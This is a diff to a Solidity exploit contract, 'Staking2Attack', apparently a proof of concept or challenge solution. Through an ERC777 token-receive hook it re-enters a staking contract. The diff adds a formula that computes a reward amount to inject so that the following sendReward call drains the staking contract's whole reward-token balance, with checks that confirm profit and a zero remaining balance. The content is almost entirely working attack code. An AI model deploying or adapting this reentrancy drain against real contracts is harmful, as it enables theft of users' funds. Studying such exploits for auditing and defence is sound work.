@@ -39,7 +39,7 @@ contract Staking2Attack is IERC777Recipient, Context {
         address operator,
         address from,
         address to,
-        uint256,
+        uint256 amount,
         bytes calldata userData,
         bytes calldata operatorData
     ) external override {
@@ -47,10 +47,26 @@ contract Staking2Attack is IERC777Recipient, Context {
         IERC20 token = IERC20(_msgSender());
         if (operator == address(STAKING) && from == address(STAKING)) {
             uint256 beforeBalance = REWARDS.balanceOf(address(this));
-            REWARDS.approve(address(STAKING), beforeBalance);
-            STAKING.addReward(token, uint248(REWARDS.balanceOf(address(STAKING))));
+
+            uint248 wipeout;
+            {
+                (, uint248 lastReward, ) = STAKING.stakerInfo(token, address(this));
+                uint256 tokenBalance = token.balanceOf(address(STAKING));
+                uint256 rewardBalance = REWARDS.balanceOf(address(STAKING));
+                // This is the amount to be added to the reward so that when we
+                // call `sendReward` we claim exactly all of the balance of
+                // `STAKING`
+                wipeout = uint248(
+                    (200 * tokenBalance * rewardBalance + 199 * lastReward * amount) /
+                        (199 * amount - 200 * tokenBalance)
+                );
+            }
+            REWARDS.approve(address(STAKING), uint256(wipeout));
+            STAKING.addReward(token, wipeout);
+
             STAKING.sendReward(token, address(this));
             require(REWARDS.balanceOf(address(this)) > beforeBalance, "Staking2Attack: attack failed - no profit");
+            require(REWARDS.balanceOf(address(STAKING)) == 0, "Staking2Attack: no wipeout");
         }
     }
 
